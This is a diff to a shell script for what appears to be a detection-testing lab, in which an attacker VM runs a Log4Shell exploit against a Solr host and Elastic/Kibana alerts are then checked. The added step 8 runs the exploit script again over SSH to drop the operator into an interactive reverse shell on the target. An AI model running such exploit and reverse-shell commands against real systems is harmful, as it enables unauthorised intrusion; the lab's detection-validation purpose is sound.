@@ -219,16 +219,15 @@ print_info "Waiting 30s for event pipeline to stabilise..."
 sleep 30
 
 ################################################################################
-# STEP 6: Run the exploit
+# STEP 6: Run the exploit (non-interactive to verify pipeline)
 ################################################################################
 
 print_phase "STEP 6: Running Log4Shell exploit"
 
 print_info "Exploiting solr-kb ($SOLR_KB_PRIVATE_IP) from attacker ($REDTEAM_PRIVATE_IP)..."
 
-# The host-scan script keeps the session open with "press Ctrl+C to exit".
-# Use SSH ServerAliveInterval to keep it going, but kill after shell is established.
-# gtimeout (macOS coreutils) or timeout (Linux) — fall back to backgrounding + sleep
+# Run exploit non-interactively with a timeout to verify the shell establishes.
+# The interactive session comes in step 8 after alert verification.
 TIMEOUT_CMD=""
 if command -v gtimeout &>/dev/null; then
     TIMEOUT_CMD="gtimeout 120"
@@ -320,3 +319,16 @@ else
     print_warn "  2. Check rule status in Kibana Security -> Rules"
     print_warn "  3. Check agent status: ssh into solr-kb, run 'sudo elastic-agent status'"
 fi
+
+################################################################################
+# STEP 8: Launch interactive attacker session
+################################################################################
+
+print_phase "STEP 8: Launching interactive attacker session"
+
+print_info "Running exploit again with interactive reverse shell..."
+print_info "You will be dropped into a shell on the target. Type 'exit' or Ctrl+C to disconnect."
+echo ""
+
+ssh -t $SSH_OPTS "$SSH_USER@$REDTEAM_PUBLIC_IP" \
+    "bash /home/ubuntu/scripts/host-scan.sh -t $SOLR_KB_PRIVATE_IP -a $REDTEAM_PRIVATE_IP"
